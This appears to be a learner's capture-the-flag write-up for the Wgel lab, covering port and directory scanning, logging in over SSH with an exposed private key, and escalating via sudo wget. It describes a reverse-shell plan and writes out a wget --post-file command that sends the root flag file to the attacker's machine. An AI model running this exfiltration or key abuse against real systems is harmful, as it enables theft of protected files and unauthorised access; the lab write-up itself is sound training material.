## 🔹 Lab: Wgel CTF
<img width="89" height="67" alt="image" src="https://github.com/user-attachments/assets/38149c46-fb41-4f4a-bbf6-b2982ac59035" />


### 📝 Reconnaissance

# Scan all ports with service/version detection and default scripts
```bash
nmap -p- -T4 -sV -sC 10.201.13.239
```
<img width="756" height="320" alt="image" src="https://github.com/user-attachments/assets/e5e816a9-d315-4b75-961f-016e0cf0ff55" />

- From our results we can see we have two open ports found, 22 and 80. With a linux OS.

  # Enumeration of Directories
- Now I am going to run Dirb to look for directories on our target machine.
```bash
dirb http://10.201.9.91 -R  
```
- Upon the scan I saw it popped up with 
```bash
http://10.201.9.91/sitemap/
```
- And also it came back with 
```bash
.ssh
```
- And inside there was this 
<img width="564" height="225" alt="image" src="https://github.com/user-attachments/assets/66822186-af09-406b-9cfe-2f531d4829a9" />
<img width="514" height="429" alt="image" src="https://github.com/user-attachments/assets/9e098714-d825-44ef-b01f-cad0de43d3da" />

- A private key, which we can attempt to SSH with to our target with, going to copy and save that as Wgelkey.txt. 
## access via credentials
<img width="284" height="63" alt="image" src="https://github.com/user-attachments/assets/623d330f-4ce2-4383-ab3c-49c059f59481" />

- We still need a valid username found to attempt it with though..

- Going back to the site
<img width="907" height="395" alt="image" src="https://github.com/user-attachments/assets/cdd0f0c9-8695-4760-b540-6994cc922c34" />
- Reviewed the page, and then remembered we should check the source.
  <img width="852" height="450" alt="image" src="https://github.com/user-attachments/assets/70cb0ebd-03ae-421a-afb6-97c1feda0a87" />
  
- And it looks like we have a user name
  
  ```bash
  Jessie
  ```
  
  <img width="551" height="241" alt="image" src="https://github.com/user-attachments/assets/3caf33c5-541c-4fd8-b4ab-7aaab1e74f31" />
  
- We got in with that. Should also not you need to change the permissions of private key files or ssh  will not let you login via keys.
  ```bash
  chmod 400
  ```
  
  <img width="805" height="426" alt="image" src="https://github.com/user-attachments/assets/21034d5a-9a13-4249-810b-0a813b560d9e" />
  
  - And our first flag is here. 





## 📝 Exploitation

- Let's find out what sudo cmds we can run as Jessie to gain further access to get our last flag.
  <img width="526" height="147" alt="image" src="https://github.com/user-attachments/assets/086d47cd-55d1-4b0e-97d6-1fe2e234816a" />
  - We can run /wget as Jessie as sudo, so lets check out https://gtfobins.github.io/
<img width="833" height="210" alt="image" src="https://github.com/user-attachments/assets/45455ef2-3c50-47a9-a7dc-54faada164f1" />

  - We see that, but I think we will need todo this
      1. Create a reverse shell file named revshell.sh
      2. host a simple http server from our IP to wget the file onto the target machine since we can run wget as Jessie.
      3. Start a listener on our machine to recieve our reverse shell.
      4. Execute our revshell.sh on the target machine to send shell back to our machine.
   - I did all this and that didn't work.. the commands to get the unrestrictive shell still was not letting me in.
 
  - Found out we can run this to with wget to get files we want back to our machine though.
    ```bash
    /usr/bin/wget — post-file=<location of root flag> <your machine’s ip>
    ```
 - At first I messed up and was trying to send it to my http server and that was wrong, use the netcat listener we setup earlier.
   <img width="761" height="105" alt="image" src="https://github.com/user-attachments/assets/df5fc2d6-d385-4e50-a1fc-c7f9d4c2d406" />
 - Here is our flag we wanted.

   <img width="590" height="253" alt="image" src="https://github.com/user-attachments/assets/b1cee36c-93aa-452f-9a6a-a724d5a55b04" />



 ## Post Exploit/Learning Points
 - This was the first time I had used wget with sudo permissions like that to exfilitrate files from the root directory, but this was a good lab to get that experience with
   and was a good learning lab to practice skills with.






    
    

